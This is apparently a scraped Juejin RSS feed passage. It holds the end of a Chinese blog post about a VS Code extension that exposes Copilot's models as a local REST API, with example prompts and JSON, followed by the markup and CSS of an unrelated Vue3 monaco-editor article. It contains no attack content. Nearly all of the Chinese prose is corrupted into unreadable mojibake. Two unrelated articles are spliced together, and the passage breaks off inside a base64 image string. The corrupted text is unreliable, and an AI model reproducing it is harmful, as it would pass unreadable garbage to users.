<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c47c7924e99b4fac9258ac3e5a460753~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56OK56OK6JC96JC9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766098188&amp;x-signature=Dh3GqphAKeHurv%2BvOTRfZ9X4fS8%3D" alt="è¿è¡Œæ‰©å±•" loading="lazy"/></p>
<h3 data-id="heading-10">3.2 ä½¿ç”¨æ‰©å±•</h3>
<p>æœ€åï¼Œå°è¯•å°†æ–‡ç« å¼€å¤´ã€Œæ‰¹é‡ç”Ÿæˆåšå®¢å¹´åº¦æ€»ç»“ã€çš„æç¤ºè¯ä¿®æ”¹å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown">annual-report æ–‡ä»¶å¤¹ä¸‹çš„ blog-posts.json æ–‡ä»¶åŒ…å«äº†å¤šä¸ªåšå®¢åœ¨ 2025 å¹´çš„æ‰€æœ‰æ–‡ç« æ ‡é¢˜ã€‚

æ‚¨éœ€è¦é’ˆå¯¹æ¯ä¸ªåšå®¢åœ¨è¿™ä¸€å¹´å‘å¸ƒçš„æ‰€æœ‰æ–‡ç« æ ‡é¢˜ï¼Œè°ƒç”¨å¦‚ä¸‹æ¨¡å‹å¯¹è¯ API æ¥ç”Ÿæˆä¸€æ®µ 200 å­—ä»¥å†…çš„æ€»ç»“ã€‚

API åœ°å€ï¼šhttp://localhost:3001/v1/chat/completions

è°ƒç”¨ç¤ºä¾‹å¦‚ä¸‹ï¼š

<span class="hljs-code">```text
POST http://localhost:3001/v1/chat/completions

Request Body:

{
    "model": "gpt-4.1",
    "messages": [
        "å¦‚ä¸‹æ˜¯ä¸€ä¸ªåšå®¢äº 2025 å¹´å‘å¸ƒçš„æ‰€æœ‰æ–‡ç« æ ‡é¢˜ï¼Œè¯·åŸºäºæ­¤ç”Ÿæˆä¸€ä¸ª 200 å­—çš„æ€»ç»“ã€‚æ€»ç»“ä»¥ã€Œæ‚¨çš„åšå®¢æ–‡ç« æ¶µç›–äº†...ã€å¼€å§‹ï¼Œæ ¼å¼ä¸ºçº¯æ–‡æœ¬æ ¼å¼ï¼Œè‹¥æœ‰è‹±æ–‡æˆ–æ•°å­—å­—ç¬¦ï¼Œå‰åè¯·ä½¿ç”¨ç©ºæ ¼éš”å¼€ã€‚",

        "æç¤ºå·¥ç¨‹éœ€è¦éµå¾ªçš„äº”ä¸ªåŸåˆ™ï¼ˆé™„å®è·µæ¡ˆä¾‹ï¼‰",
        "é—œæ–¼ 2026 å¹´å³å°‡ç”Ÿæ•ˆçš„ã€Œå¸æ¯’è¨˜éŒ„å¯å°å­˜ã€æ³•æ¡ˆ",
        "å¦‚ä½•ä½¿ç”¨ Spec Kit å·¥å…·è¿›è¡Œè§„èŒƒé©±åŠ¨å¼€å‘ï¼Ÿ",
        "Markdown å°†æˆä¸º AI æ—¶ä»£çš„é€šç”¨ç¼–ç¨‹è¯­è¨€ï¼Ÿ"
    ]
}

Response Body:

{
    "reply": "æ‚¨çš„åšå®¢æ–‡ç« æ¶µç›–äº† 2025 å¹´æŠ€æœ¯è¶‹åŠ¿ã€å¼€å‘å®è·µã€æ³•å¾‹æ”¿ç­–ã€æ—…è¡Œè§é—»åŠç¤¾ä¼šè§‚å¯Ÿç­‰å¤šä¸ªé¢†åŸŸã€‚æŠ€æœ¯ç±»å†…å®¹åŒ…æ‹¬ MCPã€ Spring Boot ã€ Spring Data ã€ MapStruct ã€ P6Spy ã€ Playwright MCP ã€ FastMCP ã€ Spec Kit ã€ Alibaba DataX ç­‰å·¥å…·å’Œæ¡†æ¶çš„å®ç”¨æ•™ç¨‹ï¼Œæ¶‰åŠæ•°æ®åº“æ“ä½œã€å¯¹è±¡æ˜ å°„ã€äº‹ä»¶è§£è€¦ã€æœåŠ¡å·¥å‚è®¾è®¡ã€æ•°æ®è¿ç§»åŠæµè§ˆå™¨è‡ªåŠ¨åŒ–ç­‰ä¸»é¢˜ï¼Œå¹¶æ¢è®¨äº† Markdown åœ¨ AI æ—¶ä»£çš„åœ°ä½ã€‚æ”¿ç­–ä¸ç¤¾ä¼šç±»æ–‡ç« å…³æ³¨ã€Œå¸æ¯’è®°å½•å¯å°å­˜ã€æ³•æ¡ˆã€å†å²äº‹ä»¶åŠç¤¾ä¼šçƒ­ç‚¹ã€‚ç”Ÿæ´»ç±»å†…å®¹åˆ™è®°å½•äº† 2025 å¹´çš„å‡æœŸæ€»ç»“åŠå¤šåœ°æ—…è¡Œä½“éªŒï¼Œå±•ç°äº†ä¸°å¯Œå¤šå…ƒçš„ä¸ªäººè§†è§’ã€‚",
    "model": "gpt-4.1"
}
```</span>

æœ€åä»¥ <span class="hljs-code">`blog-summary.json`</span> ä¸ºæ–‡ä»¶åï¼Œè¾“å‡ºä¸€ä¸ªåŒ…å«æ‰€æœ‰åšå®¢æ€»ç»“çš„ JSON æ•°ç»„ï¼Œæ ¼å¼å¦‚ä¸‹ï¼š

<span class="hljs-code">```json
[
  {
    "blog": "leileiluoluo.com",
    "summary": "æ‚¨çš„åšå®¢æ–‡ç« æ¶µç›–äº†æŠ€æœ¯å¼€å‘ã€ç¤¾ä¼šçƒ­ç‚¹å’Œä¸ªäººç”Ÿæ´»ç­‰å¤šä¸ªé¢†åŸŸã€‚åœ¨æŠ€æœ¯æ–¹é¢ï¼Œæ‚¨æ·±å…¥æ¢è®¨äº†æç¤ºå·¥ç¨‹ã€è§„èŒƒé©±åŠ¨å¼€å‘ã€Spring Boot æ¡†æ¶çš„åº”ç”¨ã€æ•°æ®åº“è¿ç§»ä¸ä¼˜åŒ–ç­‰ä¸»é¢˜ï¼Œå±•ç¤ºäº†å¯¹å‰æ²¿æŠ€æœ¯çš„å…³æ³¨ä¸å®è·µç»éªŒçš„åˆ†äº«ï¼›åŒæ—¶ï¼Œæ‚¨è¿˜ä»‹ç»äº† Markdown ç¼–ç¨‹è¯­è¨€çš„æ½œåŠ›ã€MapStruct å¯¹è±¡æ˜ å°„å·¥å…·çš„ä¼˜åŠ¿ï¼Œä»¥åŠ MCP åœ¨æµè§ˆå™¨è‡ªåŠ¨åŒ–ä¸­çš„åº”ç”¨ç­‰å†…å®¹ï¼Œä½“ç°äº†å¯¹æŠ€æœ¯è¶‹åŠ¿çš„æ•é”æ´å¯Ÿã€‚åœ¨ç¤¾ä¼šçƒ­ç‚¹æ–¹é¢ï¼Œæ‚¨å…³æ³¨äº†å¸æ¯’è®°å½•å°å­˜æ³•æ¡ˆã€å†å²äº‹ä»¶ä»¥åŠç¤¾ä¼šæ¡ˆä»¶ï¼Œè¡¨è¾¾äº†ç‹¬åˆ°çš„è§è§£ã€‚åœ¨ä¸ªäººç”Ÿæ´»æ–¹é¢ï¼Œæ‚¨è®°å½•äº†å¤šæ¬¡æ—…è¡Œä¸å®¶åº­æ´»åŠ¨ï¼Œå±•ç°äº†å¯¹è‡ªç„¶é£å…‰çš„çƒ­çˆ±ä¸å®¶åº­ç”Ÿæ´»çš„æ¸©é¦¨ã€‚è¿™äº›æ–‡ç« å†…å®¹ä¸°å¯Œï¼Œå…¼å…·ä¸“ä¸šæ€§ä¸ç”Ÿæ´»åŒ–ï¼Œä½“ç°äº†å¹¿æ³›çš„å…´è¶£ä¸æ·±åˆ»çš„æ€è€ƒã€‚"
  }
  // ...
]
```</span>
</code></pre>
<p>æœ€åï¼ŒCopilot ç”Ÿæˆçš„ä»£ç ä½¿ç”¨äº†æˆ‘ä»¬æä¾›çš„ APIï¼Œå¹¶æœ€ç»ˆç”Ÿæˆäº†ç¬¦åˆé¢„æœŸçš„å†…å®¹ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/08d6d1dc02c7422283a15bd65ebc2bb2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56OK56OK6JC96JC9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766098188&amp;x-signature=CI3QTJlkLdr4ixZf%2BJRtl1g8PfE%3D" alt="ç”Ÿæˆäº†ç¬¦åˆé¢„æœŸçš„ç»“æœ" loading="lazy"/></p>
<h2 data-id="heading-11">4 å°ç»“</h2>
<p>ç»¼ä¸Šï¼Œæœ¬æ–‡ä»¥å®é™…ä½¿ç”¨ Copilotã€Œæ‰¹é‡ç”Ÿæˆåšå®¢å¹´åº¦æ€»ç»“ã€æ—¶ï¼ŒCopilot å› æ²¡æœ‰ç›´æ¥å¯ç”¨çš„æ¨¡å‹ API è°ƒç”¨è€Œæœªèƒ½æŒ‰é¢„æœŸå®Œæˆä»»åŠ¡ä¸ºç”±ï¼Œæå‡ºäº†ç¼–å†™ VS Code æ‰©å±•æš´éœ² Copilot è‡ªèº«å¯ç”¨æ¨¡å‹çš„æƒ³æ³•ã€‚</p>
<p>ç»è¿‡å®è·µï¼Œå‘ç°é€šè¿‡ç¼–å†™ VS Code æ’ä»¶ï¼Œå¯ä»¥æˆåŠŸè·å–åˆ° Copilot çš„å¯ç”¨æ¨¡å‹ï¼Œå¹¶æˆåŠŸä¸æ¨¡å‹å®ç°å¯¹è¯ï¼Œä»è€Œå°† Copilot å¯ç”¨æ¨¡å‹æš´éœ²ä¸º REST API å˜ä¸ºäº†ç°å®ã€‚</p>
<p>æœ¬æ–‡å®Œæ•´ VS Code æ‰©å±•å·¥ç¨‹å·²æäº¤è‡³ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fleileiluoluo%2Fdaily-exercises%2Ftree%2Fmain%2Fcopilot-models-rest-api" target="_blank" title="https://github.com/leileiluoluo/daily-exercises/tree/main/copilot-models-rest-api" ref="nofollow noopener noreferrer">GitHub</a>ï¼Œæ¬¢è¿å…³æ³¨ã€Forkï¼Œæˆ–è·å–æ‰©å±•æ–‡ä»¶æ¥ä½¿ç”¨ã€‚</p>
<blockquote>
<p>å‚è€ƒèµ„æ–™</p>
<p>[1] Visual Studio Code Extension API: Your First Extension - <a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.visualstudio.com%2Fapi%2Fget-started%2Fyour-first-extension" target="_blank" title="https://code.visualstudio.com/api/get-started/your-first-extension" ref="nofollow noopener noreferrer">code.visualstudio.com/api/get-staâ€¦</a></p>
<p>[2] Visual Studio Code Extension API: Language Model API - <a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.visualstudio.com%2Fapi%2Fextension-guides%2Fai%2Flanguage-model" target="_blank" title="https://code.visualstudio.com/api/extension-guides/ai/language-model" ref="nofollow noopener noreferrer">code.visualstudio.com/api/extensiâ€¦</a></p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue3é¡¹ç›®é›†æˆmonaco-editorå®ç°æµè§ˆå™¨IDEä»£ç ç¼–è¾‘åŠŸèƒ½]]></title>    <link>https://juejin.cn/post/7582438310104629294</link>    <guid>https://juejin.cn/post/7582438310104629294</guid>    <pubDate>2025-12-12T02:32:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582438310104629294" data-draft-id="7582182817109180442" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue3é¡¹ç›®é›†æˆmonaco-editorå®ç°æµè§ˆå™¨IDEä»£ç ç¼–è¾‘åŠŸèƒ½"/> <meta itemprop="keywords" content="å‰ç«¯,Vue.js"/> <meta itemprop="datePublished" content="2025-12-12T02:32:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç­”æ¡ˆanswer"/> <meta itemprop="url" content="https://juejin.cn/user/2634865719391869"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue3é¡¹ç›®é›†æˆmonaco-editorå®ç°æµè§ˆå™¨IDEä»£ç ç¼–è¾‘åŠŸèƒ½
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2634865719391869/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç­”æ¡ˆanswer
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-12T02:32:25.000Z" title="Fri Dec 12 2025 02:32:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#2b2b2b;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(159,219,252,.15) 3%,transparent 0),linear-gradient(1turn,rgba(159,219,252,.15) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin-top:35px;margin-bottom:10px;color:#4dd0e1}.markdown-body h1{font-size:30px;text-align:center;position:relative;width:max-content;margin:0 auto}.markdown-body h1:before{position:absolute;content:"";z-index:-1;top:-20px;height:100%;width:100px;left:0;right:0;margin:0 auto;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADsAAAA6CAYAAAAOeSEWAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAABkLSURBVGhDtZoHnJ1llcbP3Om9ZiYzmfSQhCQQIbRQVQKI9CYC68qKriJK0UXcZRcINqStIoiIqKCi1NACQihBWiCkkJ5MJlMyvd7p7d759v989/sy34yTbIj48Atz71ff855znvOc971xDrB/EtoGI7a9Z8Aq+wZML0mNj7dE95NZ1OKsj1dHo1GbnJpss9OTbWJyonvun4VP1Njuoagtb+m0it4By0iIt8LEeMvkr8XFWcfgkA1gYDLf47i2PzpsyU7UspKSLDoctagTZ7Vc08MzClMS7awJ2ZaflBB78CeET8TYla1dtrKt2w5KS7YCDGzEoz2RqKUmhGw6x2bhuXyOp2BoRXef1Q1E7Lj8TIsMD1sbxu1kcnYSAX1810RMTUmyMB7f2j1gC7NS7byinNiL/kH8Q8a+2NRh77b32El56VaPAe0YeGR2mh2bm+FdMRqP1rbZe+3dFsHT35qcb/Oz0rwzo7Gxs9feYPLS4kM2h8lawee5hPmlJXneFQeGAzJ2F564v7rFzi7Msu3d/Xgjzq5g8ArX8VCNN2vJ28daey0zZJabmGCLslP5HOf+Oygr3UzDGOf+JxrauXfQjslJt+dbuuyMgiwmk+sPAB/b2Lt2NdoMZnuY21qHIvbvUyZ4Z0ZQiXGrWjvsmPxsK4R0nmHA8ZCTQvxVQn5eRipklIBtcVbV1WtHYsjati47ZWKuTUpP9Z4yGk/xDBGe3v1mW4/dOrvYO7P/2G9jRSjf31FnXyaUXiB8r51WaJkM3kcfOSa2FR6qarIenooTLQHPLcC4mYThyw1tVpKWYlVERlZ8nC3Oz3Jzdn1nn5uvQ8OOHYvhR/CvsqffJbkCkZTvcYZ6Z0WTfTovw5Y1dtjXp+TbFPhgf7FfxpYxuMfr2uwo8rEtMmwXF+d6Z8wGmIR2PLyjo8cqOFffP2SLGexJEJCP9R29thkPXlpa4A5Y3w/jmuVNYYwO2QkY7WMtz3mVcE1hkualJdmSolzX8GnpKd4VZq80d1o7zN0RdWxGaqItgbn3B/+vsasgh/UMNBOvzYMZDxtDKp289KGaVguFQvb1yQWWwuB97GaSXqUUnVaYbSUwrDCEBz/C2CM8EhNrP13fbkeSh3OJgCAe2N1CWXKsGOc6TOr5U4q8MwYhDtkTda02MyPN+nnGBQEH7A37NHYz5KOZVv08qyjbSseEzKauPnsMj98wc6Ibcj5UUv7M8QWZTE52jEwGOVaD8U1Dw1YNWX0qM8VKyb80L/TrOPYOzH4KBJQTrK8M7+7KZjuM63sHBt17FubGoibCuf+tarWFGUmuwWeT8/vCXo1tZOYeZcazCaez8MwEzzM+HqhqtiJI5twxL1jeGLYk7jmKMF1JOCbg6Qj5nAdRqX7q3BYm8VAmQvW1lfcMc58IT95uIA3q+gftrDHPXUXJWkVEHJme5Bp5UmHsvIZ/O3l8ECE/FWcsItX2hr0ae8O2Wjs+J43QTbOZzGYQ/7Wtxq6eXjRK3r0By4YJ6Ty8EiYSJqcm2eGeV4Pox/ANENJR49RiEdfqcLflUJrEBZqgxYHrBjn2ExFURqKdVETN9YirJxKxR2rbrYeQv5ISmB6IsiDGNfZGWPeMgkzr58xnPaJ5p6XDZPKz4T77wayJ7jGhhXLwanOHTWBgq5n5q6YUwNJ7l3kKcRl7OJ7fF56l1GzvHbSD8dghTPi0wIRfv6XafjJ3ssv0PnZQ7nZx/etwzO1zJ3lHR2OETTw8x0tOx1AN3De0D7YV+63oGthjaJQ5Ur7eVVZjcdGInUyuaT73ZWg3efV8fZs7cc2E777Qi5eunVbghvPPymrt/krKGfcLd8ybYjdxrK6333Z09rjHZkNuLYzz0uIc+xWCZzz8nbHbe4dsY1e/XUOY+nimvtUaSazv4jXhaQasSbmYmpuenGwHZ8TKggSEQm08rMD7ahBOoExcMqXQegjnZ+CEvaEa1ZQUQkt39dj0zDS7krq+ARmpdws/nlNqD9WFbWN7l5u3wr9MyrcXKUsqWy3jTOaoML4DdaQ83YIoT4VYpEXvYQZLmbX5SLohBrgOj186Kc/iKTUPUhq+Rrm5ekOl3TWv1Mr6hqwbY0VOQXwEo+Moq4Z47q5qsU489G944LyJOW4LOLZOKtT/iI6+nGe/0dhuEd4ltj2NmiuCU4hnk5fHIi7+RK4uTEu0e+s7rAiRcw1CYy3OejvcYz+eXeI9MYY9nu3lYZl0KavJJ7Vjibzgjp319rUZE20j7CkJqFr5JQYgQ39f3eQaKpQk0afy8nl4uBzvjUUTRk7k3iebOm0pabDiyFn2XGu3dRME41CGVeBVqSiVnc6hIUpekp1VjHLDSOEcQlui5W/U8C7IKREjv1Gabw3wRwUTvpv7jybPtzHmIPZ49q6KRjuccqBQVCOtGvqXhrCFUUXJzOYSHt7Kw5Ix9H08dSje1o1JyL73IYXpEMmE5CRbw6wuykx2pR+Pd6/J4JpLiJKV6N9OnrcQNfQ0Zem6qQX2MmFXyWTE+DMO0kGx4e08DEjnXbsYuOq7niHB8jdY/wQ8Srm2XCZZUrOakF1CY5EKX0h93Tu/1J4kRdbDMT8MamgZK9xe3uDcvrPe++Y4f61rcZr7B53rN1c5N2ytcV5rCrvHt3T2Og19g+5nH7dvq3bqunr4NOwgK2MHA1jeEDuG7HNuLmtw7qpocl5t6nCPvdTQ7v4N4u3WTqeyu9cZHIo4f6lqdFoHh7wzMbzDeeGv3Hvzjlrnh2W1zofhHuftxpFn3VFe7zxS0+p0DlKVPbhhvBxhvwiFMgfP+mjHA08gEC4pybeLyK1iZldh8zC5VJQyUl8l59KZ0WJk2xaiYWxNrkXXJhA8r3PvZRur7ZZZRfadaRPsfiTmX9HGajC2tXd6V8dQTMhX0h8rNdJx9Ra8F8SbRNLzhPRnJmTZIUTYueTyWxyr7uv3rjC3OkzE8495oS+4xq6D5WoI0bO5WVCOSerl8rIeBrOI/Hkaw6ME5W1zSuzx2la3CRdWi3zIG+FDBvUp9LMgI/vggUmE7KkT81yGvOOgEYa/aUahhRAF5xLec3OzbF1r2O17BbVxIi7hzJIC64IYhXdJA+nh/5xVbOmE9J0QqjSxWk0pp37M2YEtgjS8GpimACu7xkqxdKJ6fEXyYl2Lre0ZtC8yELVewtWUnbfCPIhrvgDFz8WI5yhJKgcnFMZWEFrwhgzo5uWDDDA1oGSOzcu0xfx7vTlsv6posIMpJ6cGWPiw/BxL4PU7vbrpjgf8bMdu5OYwOdhm83DARUSa0ELknYIeEAaILuWxlhGa0M8+EuJCrpJT+ymENhN60pXBxa3LZ5TsucnlGaCmIEQ4Evru91yuz0xMtKaeXluI5zdh9Mm8vAlBn4aR07X64EH3vEKdXQkZJXPP/JxMvNRpLxEtHZ5RQgmNewnpouvVTpYTHdfOnmy5kFUGnpRTfEhXD9DiBdFFJB0/YWS9aj6pmc89r0BaQmgTRkgI+EsdKsYasJZOBF+QqTH474NK7LbyBvf7W+RgOxNyxfQY2/2hrp2+NkroxrzrQ55fSZkpJIa28znCgF6rb7H1hOSslATyvNflAh9pvHcX3lVE/Ya8FjTJIexa2Rq77nfU96unTnD7aME3+TAm6BFKYrPnqCNIqV5sq0ZGCiEV+Db+qWMQqpFgb5KPx48R6omeDl2EuP9DTYt9iGA/f1KBS1w/La+H4ktsSmLItvZHXLUkrCeflVtJ9DVVg1H7+sxiGvVM975rZpfabuqHVhuP5F1vewav5O8GamUe91yDanoYw47FWzC929O+DJnKA2opFY1Rjru5CE7kOcO0jJtQVUIynzuZEMeb+1CEOFXN8iFSGeRpCm1BTlJxVg49Azm819SO7Bu0axEbwn27GuxMck+TMQHDP8fn48gfDVIL4R8xKVPJ73MQBUIfA/Z54LMw5vmlE+w+VFo2A78X/SsyPA/RMD0z3e2qVLtfo7aeBslpMX0N0TEnLcUlKym1jyBFqSohmYntI5enBhYB9CY/2kNarhwJhNiMtRGyWnkQdKaCFyQwgydjyNUw4VchKxXv2/DoKdC+lkQbCX1NlKCGvJiBJkSGbCus6jfo4yGBNySgr+u7e20BCsxdVAcFlJ/tHd32+cIsNxSXUULUUx+dg/d47g7OPYFw2MxkSuyMwLHVTI6PBN6dS8Sppw45zHJSgDXV3aQzmz40Z6fDgBfiAXU0uZxby2zejee+j3eltoQMzhV6qSBogXwrEXDj7ElWxUQ8RrnSaoU0dxIsKaiMvMykXTu90NqJsGHP4z78SdLigUrLKat32nFwy/E07pfDFRdQ/7N5r57pQ1482uvWhMGhQcviGkVrKDUp0ToCxfhQal5n4Hs/g1jOgH4LWdwFOd1b1WzHET4vLZppv+Czjxo840OrDlG8jAJzv2tp5mLK1dsU/lfIOeWy5NxFxfl2BoYImlQtx9QF6mJRQKBsQYYuO2yaLYPBUXvu/VqYPxtHhNy7Y4hCkNLGPtKSklzCVKSHtMQxcqm5Kw1DhI2PTGZtcGDAvoLQ/u7MifYtWFBlxz2H9zo8RkwKzC5UYiG+p44ccqE62YAxLeT/TOpf8MXx8Qk0IJFRY1Go+viQVJpE5Ehjf49xfAZeqGIy/7us3nqxwQfCkjZypPxobVr/6YpQHIalUvuCyEwbSXC9PC8QnkFcXlrgLpoLIhIfKuaqlQkYIAwQnr/f3eyu7KttOw2lNpv8/BPHyjzVNER3o72gvEBKqRMTflndbP8BMweRDyeciEj5bFayFXqTLzheivgYJC0jwzwHa0MDDEotm48ndze5BBBElAnxxcRYHAFh3FfZaA9UNRmC354kNwUx8eHkmVj5dcTE5ZMnuEyr1QqlhtaJLuOYZv4v3KNo0TKrGPUZ1NILPKuWcvVn5Trv10SMB6h0j/ARMnlOuafCBIfnSWEx/Raif3HDzofYMM31dOyY9LBaLK3TjoX2fEqT4+2qaUVWSTQvyM6wC8nNJyEetXIyuLKrx04P7MKNnbJZlKUtNAIHo7i2dA/YU3Vtdi5l6jCepXy8hOedSSSsI8/HQg5Q+gxTKXwkMHkbESo+hjG0lbRRzQ3Fc5LOzDuFhs3Ptumpie7ilRDhlEJOq/hjsZljCxjkt7fWuPS/EekpXMggJQIk0G+eN9Xu2VmHWIkJe0nJRN4ptBBit2yutG9ML7J1DHAxebiAMrZ4VZlduqGS8I2tJc2iborUxmIN79c+kTovFxivPvrcSaP3n7RSKYTUmKt4N3rMOcw4JOneD3sP956jNaMglIeTER5Xbdlt15Tm2W10NEsYrA/N5JLCHHsR9tSqwxq08G3bqm1ZTbOtagnbo6SLvH/VzBL7W7jPzqFea0LmMLFzUuLtdwumuO3i1Vtq7OK15Xgw3l1PDmIXak+6QBEkvB9YJIzBcc/L20JIYaSZ/qAzVm5Ut4oowk3QehC+N3xo/1wTqt7zsYawfX9no9XjqdPXVLhrwyo/wucJYQkE1e4j8rLcBuHUItQQKqgMXb6LGvxFQlXw33AdZLR0V5P9Fr29lP73scNnosoyvdWPv4fPJ+uJrLVtMakqaL1M1cTvv0OLIZE6wk2a2IcIRUQh+DaejpdcXepBa7bKDRGM9PIVxTl2EwarZ72rooVuY4RQtMypdk6e1lLLehhY2lt7QEd7WxlCDvdIli6E9B4+ZIodmZEMccUGqgiZOqru9tkR3iJ8nCcXRWRZCSPMLPEjlx2LjQL1OM5qKAm+vhSuRqSfV5Ttrg8FdWcrnhMqCTex7DEM6qTsVEuM1+8hovaHQ6e6a1Fz0xLd3nUt4ToWWuzWNkhcoAIIjUx2ZpxjLzWF9+SYmngR1lok4TEoJxGfuijhI/7OICoFmadl2llcL9b1oRVJtbD+JLlv1KrhHG5811t9ELbzgk14ICUwqE+TDzftqHPz98vUSy3jSIwP8dCpkNqLDPTx+rArz4T5qLG3G2PrvJKKPoLBWE501NC3ilUX5mVjVIb9nIbgWcpPMiSXjbcL8K62UkR86m1/yfkSeMaHFuK04X0CE3J6SWzFUxw0BSNHlSzi3RmIRJwHq5udO3c16quLp6sbnffbupxbt+12vzOrzuvNHc7ycRbIxuJHgYU7YSASdQgxp7qz2ynv6HJeqW91doa7nLruXof+17sqhhu31Xif9o7HalqczV29Dnrb/f5EXZvzdH27U98/6LR5i3N0UM5zjHU71/lwjRWWltU5CAIn7F1MqLp/r9hQ5RoaxG+qmrxP4yNKcfsFLwuiprffeb2l03m2scO5h3Or2rudzjGrhk8x4Cqu2xcexilBvNEcdi5Yu4tKF3Ue4tzPy+td5/1md4tzw5iJ27NuXEYobYUdlb8z6GTWkdxaCvk2zHjd5mpKQ459mv5TkAp6mQb9Aq9HHQ8S6mrZnuc6vUG6WHusIhCJGNXl9byvnJyaiE7+Eoz8c5TYNQiUveENGpJpcIJ+biS8R0+rlcazGNs7pKB+zPLTOSX2KNWhlDAf4r2Spj72JORB5OyHULX+dlD/FOky/HFy5ygYU0sey/i8moeqdunXK1qC3RuaMOYHlI/raQMl3M+EeTV5WxD3Km8a8PkM8nr648sQ9+esKbf5e/nxiKBfAOQkxbv3SU9LYmqPV9V/Pn+V20VwTyVjTqCI6edEQUOFUXs9WmfSll8DyX2dt7GlnwkswaM3l9XZ0oNK3MTXbxpOV2sGk69s6XCJw4cY8KbyRrt9TrHt7Bm0rRBQe1+fHUWNfaapU0KbqxzbORC1M/LS3dJwIl3KOrwykQG/E+61q+isgniztdOKqNOziDgZqZIzFwPvqGiyg5NCtoCqoG5NxHhPZTOsnORulKskjoKMDeLuXQ3OmnC3syxARFXdfc57LR3OrdtrvSOOs55rnqhtcdoGhpxHdjc5EfJUuHZTlftX+G15rXPlhkrnLe59F7Lz8VGHdg8c5y2OLeMZ126qduq9XC3v7nd+FchLvYPJd15gPCu8XQnh/qpm59WGVudZzvvQO97kXTcGxhnEuJvR39tWY8cwK4uhcikk4a3Gdstg9l5B2t0wfaTdWkEou5vCPOV5PH73vFL3+DfXltnh6OxjkJD6Wd5F3g88tMe6CW/7YmI99VIL4u0oqUK8ocW4d8hFrXMVoOQU8s3U97MnjvDD/XRYkyhHM1MT3GVZQR2Tdv70U8EbA5vlo+CaPAaaSWoZXm50otGodxQ6L6txGKxzw5ZYORrBsPPrykZKQIy1n8bTjwb2fO4Te3ue7x6KOKvaYns1wtIddd4nx3mwot55qyl2360cp81zurg+CGqwU8v4/Of5uAVvPgO